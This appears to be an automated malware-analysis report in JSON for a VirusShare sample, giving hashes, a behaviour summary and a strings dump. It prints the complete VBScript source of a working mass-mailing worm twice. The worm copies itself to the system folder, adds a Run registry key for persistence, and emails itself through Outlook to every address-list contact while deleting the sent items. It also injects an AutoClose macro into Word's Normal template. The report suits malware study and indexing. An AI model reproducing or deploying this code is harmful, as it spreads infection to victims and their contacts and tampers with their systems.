{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Environ": "May read system environment variables",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "' Summer\n\nOn Error Resume Next\n\nDim A02\nDim A06\nDim A07\nDim A05\nDim A09\nDim A10\n\n\nCreateObject( \"Scripting.FileSystemObject\" ).CopyFile WScript.ScriptFullName, CreateObject( \"Scripting.FileSystemObject\" ).BuildPath( CreateObject( \"Scripting.FileSystemObject\" ).GetSpecialFolder(1), \"Summer.vbs\" )\n\nCreateObject( \"WScript.Shell\" ).RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" & \"Summer\", CreateObject( \"Scripting.FileSystemObject\" ).BuildPath( CreateObject( \"Scripting.FileSystemObject\" ).GetSpecialFolder(1), \"Summer.vbs\" )\n\nA04 = CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" )\n\nIf CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = \"\" Or CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) > 20 Then\n   CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = 0\nEnd If\n\nIf CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = 0 Then\n   Set A05 = CreateObject( \"Outlook.Application\" )\n   Set A06 = A05.GetNameSpace( \"MAPI\" )\n\n   For Each A07 In A06.AddressLists\n       Set A08 = A05.CreateItem( 0 )\n\n       For A09 = 1 To A07.AddressEntries.Count\n           Set A10 = A07.AddressEntries( A09 )\n\n           If A09 = 1 Then\n              A08.BCC = A10.Address\n           Else\n              A08.BCC = A08.BCC & \"; \" & A10.Address\n           End If\n       Next\n\n       A08.Subject = \"Hottest Summer News\"\n       A08.Body = \"Go to the beach and have fun\"\n       A08.Attachments.Add WScript.ScriptFullName\n       A08.DeleteAfterSubmit = True\n       A08.Send\n   Next\n\n   CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = 0\nEnd If\n\nCreateObject( \"WScript.Shell\" ).RegWrite \"HKEY_LOCAL_MACHINE\\\" & \"Summer\", CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) + 1\n\nsHeader = \"Private Sub AutoClose()\"+vbCRLF+vbCRLF+vbCRLF+\"Dim sStr As String\"+vbCRLF+vbCRLF+\"sStr = \"+Chr(34)+Chr(34)+vbCRLF\nsFooter =\"Dim sFind As Long\"+vbCRLF+vbCRLF+\"idx = 1\"+vbCRLF+\"sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)\"+vbCRLF+\"While sFind\"+vbCRLF+\"  Mid(sStr, sFind, 1) = Chr(34)\"+vbCRLF+\"  sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)\"+vbCRLF+\"Wend\"+vbCRLF+vbCRLF+\"Set fso = CreateObject(\"+Chr(34)+\"Scripting.FileSystemObject\"+Chr(34)+\")\"+vbCRLF+\"Set Script = fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0), \"+Chr(34)+\"export.vbs\"+Chr(34)+\"), True)\"+vbCRLF+\"Script.Write sStr\"+vbCRLF+\"Script.Close\"+vbCRLF+\"winFolder = Environ(\"+Chr(34)+\"WINDIR\"+Chr(34)+\")\"+vbCRLF+\"'Shell winFolder + \"+Chr(34)+\"\\export.vbs\"+Chr(34)+\", 0\"+vbCRLF+vbCRLF+\"End Sub\"+vbCRLF\n' Read our code in\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.OpenTextFile(Wscript.ScriptFullName, 1)\nWordVirus = f.Readall()\nf.Close\n' Replace any quotes\nWordVirus = Replace(WordVirus, Chr(34), Chr(167))\nlines = Split(WordVirus, vbCRLF)\nFor n = 0 to Ubound(lines)\n  lines(n) = \"sStr=sStr+\" & Chr(34) & lines(n) & Chr(34) & \"+vbCRLF\"\nNext\n' Get Word's Normal Template\nSet WordObj = GetObject(\"\",\"Word.Application\")\nIf WordObj = \"\" Then Set WordObj = CreateObject(\"Word.Application\")\nWordObj.Visible = True\nWordObj.Activate\nWordObj.Options.SaveNormalPrompt = False\nSet NTI1 = WordObj.NormalTemplate.VBProject.VBComponents.Item(1)\n' Infect Normal Template\nIf NTI1.Name <> \"SummerCity\" Then\n  NTI1.CodeModule.DeleteLines 1, NTI1.CodeModule.CountOfLines\n  NTI1.CodeModule.InsertLines 1, sFooter\n  NTI1.CodeModule.InsertLines 1, Join(lines, vbCRLF)\n  NTI1.CodeModule.InsertLines 1, sHeader\n  NTI1.Name = \"SummerCity\"\nEnd If\n' Clean up\nset NTI1 = Nothing\nset WordObj = Nothing\n"
    },
    "filename": "VirusShare_36f802563dab6aea43a4497b902ac942",
    "filesize": 3735,
    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "36f802563dab6aea43a4497b902ac942",
        "sha1": "924cd331a5a3df0d2ce35bb202ae0019fa66626b",
        "sha256": "b4285124a4081a54f39484a246ddd817ab91fbe34167ed915651ce08cce40099"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "' Summer",
            "On Error Resume Next",
            "Dim A02",
            "Dim A06",
            "Dim A07",
            "Dim A05",
            "Dim A09",
            "Dim A10",
            "CreateObject( \"Scripting.FileSystemObject\" ).CopyFile WScript.ScriptFullName, CreateObject( \"Scripting.FileSystemObject\" ).BuildPath( CreateObject( \"Scripting.FileSystemObject\" ).GetSpecialFolder(1), \"Summer.vbs\" )",
            "CreateObject( \"WScript.Shell\" ).RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" & \"Summer\", CreateObject( \"Scripting.FileSystemObject\" ).BuildPath( CreateObject( \"Scripting.FileSystemObject\" ).GetSpecialFolder(1), \"Summer.vbs\" )",
            "A04 = CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" )",
            "If CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = \"\" Or CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) > 20 Then",
            "   CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = 0",
            "End If",
            "If CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = 0 Then",
            "   Set A05 = CreateObject( \"Outlook.Application\" )",
            "   Set A06 = A05.GetNameSpace( \"MAPI\" )",
            "   For Each A07 In A06.AddressLists",
            "       Set A08 = A05.CreateItem( 0 )",
            "       For A09 = 1 To A07.AddressEntries.Count",
            "           Set A10 = A07.AddressEntries( A09 )",
            "           If A09 = 1 Then",
            "              A08.BCC = A10.Address",
            "           Else",
            "              A08.BCC = A08.BCC & \"; \" & A10.Address",
            "           End If",
            "       Next",
            "       A08.Subject = \"Hottest Summer News\"",
            "       A08.Body = \"Go to the beach and have fun\"",
            "       A08.Attachments.Add WScript.ScriptFullName",
            "       A08.DeleteAfterSubmit = True",
            "       A08.Send",
            "   Next",
            "   CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) = 0",
            "End If",
            "CreateObject( \"WScript.Shell\" ).RegWrite \"HKEY_LOCAL_MACHINE\\\" & \"Summer\", CreateObject( \"WScript.Shell\" ).RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"Summer\" ) + 1",
            "sHeader = \"Private Sub AutoClose()\"+vbCRLF+vbCRLF+vbCRLF+\"Dim sStr As String\"+vbCRLF+vbCRLF+\"sStr = \"+Chr(34)+Chr(34)+vbCRLF",
            "sFooter =\"Dim sFind As Long\"+vbCRLF+vbCRLF+\"idx = 1\"+vbCRLF+\"sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)\"+vbCRLF+\"While sFind\"+vbCRLF+\"  Mid(sStr, sFind, 1) = Chr(34)\"+vbCRLF+\"  sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)\"+vbCRLF+\"Wend\"+vbCRLF+vbCRLF+\"Set fso = CreateObject(\"+Chr(34)+\"Scripting.FileSystemObject\"+Chr(34)+\")\"+vbCRLF+\"Set Script = fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0), \"+Chr(34)+\"export.vbs\"+Chr(34)+\"), True)\"+vbCRLF+\"Script.Write sStr\"+vbCRLF+\"Script.Close\"+vbCRLF+\"winFolder = Environ(\"+Chr(34)+\"WINDIR\"+Chr(34)+\")\"+vbCRLF+\"'Shell winFolder + \"+Chr(34)+\"\\export.vbs\"+Chr(34)+\", 0\"+vbCRLF+vbCRLF+\"End Sub\"+vbCRLF",
            "' Read our code in",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set f = fso.OpenTextFile(Wscript.ScriptFullName, 1)",
            "WordVirus = f.Readall()",
            "f.Close",
            "' Replace any quotes",
            "WordVirus = Replace(WordVirus, Chr(34), Chr(167))",
            "lines = Split(WordVirus, vbCRLF)",
            "For n = 0 to Ubound(lines)",
            "  lines(n) = \"sStr=sStr+\" & Chr(34) & lines(n) & Chr(34) & \"+vbCRLF\"",
            "Next",
            "' Get Word's Normal Template",
            "Set WordObj = GetObject(\"\",\"Word.Application\")",
            "If WordObj = \"\" Then Set WordObj = CreateObject(\"Word.Application\")",
            "WordObj.Visible = True",
            "WordObj.Activate",
            "WordObj.Options.SaveNormalPrompt = False",
            "Set NTI1 = WordObj.NormalTemplate.VBProject.VBComponents.Item(1)",
            "' Infect Normal Template",
            "If NTI1.Name <> \"SummerCity\" Then",
            "  NTI1.CodeModule.DeleteLines 1, NTI1.CodeModule.CountOfLines",
            "  NTI1.CodeModule.InsertLines 1, sFooter",
            "  NTI1.CodeModule.InsertLines 1, Join(lines, vbCRLF)",
            "  NTI1.CodeModule.InsertLines 1, sHeader",
            "  NTI1.Name = \"SummerCity\"",
            "End If",
            "' Clean up",
            "set NTI1 = Nothing",
            "set WordObj = Nothing"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.286707",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
